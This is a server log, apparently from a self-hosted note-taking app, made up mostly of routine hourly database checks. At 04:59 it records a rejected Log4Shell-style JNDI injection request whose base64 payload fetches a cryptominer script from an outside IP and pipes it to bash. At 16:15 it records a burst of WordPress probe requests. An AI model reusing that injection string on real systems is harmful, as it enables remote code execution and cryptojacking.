00:22:00.444 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
00:22:00.459 All consistency checks passed with no errors detected (took 14ms)
01:22:00.445 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
01:22:00.460 All consistency checks passed with no errors detected (took 15ms)
02:22:00.448 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
02:22:00.467 All consistency checks passed with no errors detected (took 19ms)
03:21:58.974 Optimizing database
03:21:58.978 Optimization finished in 2ms.
03:22:00.450 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
03:22:00.466 All consistency checks passed with no errors detected (took 16ms)
04:22:00.479 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
04:22:00.498 All consistency checks passed with no errors detected (took 20ms)
04:59:38.148 Error: Router not found for request GET /t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D//46.8.226.196:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMjYuMTk2L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjI2LjE5Ni9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==%7D%27%29
05:22:00.480 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
05:22:00.495 All consistency checks passed with no errors detected (took 15ms)
06:22:00.483 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
06:22:00.498 All consistency checks passed with no errors detected (took 15ms)
07:22:00.504 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
07:22:00.519 All consistency checks passed with no errors detected (took 15ms)
08:22:00.524 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
08:22:00.537 All consistency checks passed with no errors detected (took 12ms)
09:22:00.526 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
09:22:00.539 All consistency checks passed with no errors detected (took 13ms)
10:22:00.543 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
10:22:00.556 All consistency checks passed with no errors detected (took 13ms)
11:22:00.560 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
11:22:00.575 All consistency checks passed with no errors detected (took 15ms)
12:22:00.574 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
12:22:00.586 All consistency checks passed with no errors detected (took 13ms)
13:21:58.984 Optimizing database
13:21:58.988 Optimization finished in 1ms.
13:22:00.574 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
13:22:00.588 All consistency checks passed with no errors detected (took 15ms)
14:22:00.585 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
14:22:00.599 All consistency checks passed with no errors detected (took 14ms)
15:22:00.592 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
15:22:00.605 All consistency checks passed with no errors detected (took 13ms)
16:15:37.812 Error: Router not found for request GET //wp-includes/wlwmanifest.xml
16:15:38.010 Error: Router not found for request GET //xmlrpc.php?rsd
16:15:38.406 Error: Router not found for request GET //blog/wp-includes/wlwmanifest.xml
16:15:38.612 Error: Router not found for request GET //web/wp-includes/wlwmanifest.xml
16:15:38.816 Error: Router not found for request GET //wordpress/wp-includes/wlwmanifest.xml
16:15:39.058 Error: Router not found for request GET //website/wp-includes/wlwmanifest.xml
16:15:39.292 Error: Router not found for request GET //wp/wp-includes/wlwmanifest.xml
16:15:39.610 Error: Router not found for request GET //news/wp-includes/wlwmanifest.xml
16:15:39.893 Error: Router not found for request GET //2018/wp-includes/wlwmanifest.xml
16:15:40.215 Error: Router not found for request GET //2019/wp-includes/wlwmanifest.xml
16:15:40.502 Error: Router not found for request GET //shop/wp-includes/wlwmanifest.xml
16:15:40.804 Error: Router not found for request GET //wp1/wp-includes/wlwmanifest.xml
16:15:41.088 Error: Router not found for request GET //test/wp-includes/wlwmanifest.xml
16:15:41.333 Error: Router not found for request GET //media/wp-includes/wlwmanifest.xml
16:15:41.593 Error: Router not found for request GET //wp2/wp-includes/wlwmanifest.xml
16:15:41.857 Error: Router not found for request GET //site/wp-includes/wlwmanifest.xml
16:15:42.041 Error: Router not found for request GET //cms/wp-includes/wlwmanifest.xml
16:15:42.218 Error: Router not found for request GET //sito/wp-includes/wlwmanifest.xml
16:22:00.598 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
16:22:00.613 All consistency checks passed with no errors detected (took 15ms)
17:22:00.599 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
17:22:00.611 All consistency checks passed with no errors detected (took 11ms)
18:22:00.600 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
18:22:00.613 All consistency checks passed with no errors detected (took 13ms)
19:22:00.621 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
19:22:00.634 All consistency checks passed with no errors detected (took 14ms)
20:22:00.624 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
20:22:00.634 All consistency checks passed with no errors detected (took 11ms)
21:22:00.626 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
21:22:00.639 All consistency checks passed with no errors detected (took 13ms)
22:22:00.646 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
22:22:00.659 All consistency checks passed with no errors detected (took 14ms)
23:21:59.003 Optimizing database
23:21:59.005 Optimization finished in 0ms.
23:22:00.648 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 289, attributes: 441, etapi_tokens: 0, blobs: 226
23:22:00.666 All consistency checks passed with no errors detected (took 19ms)
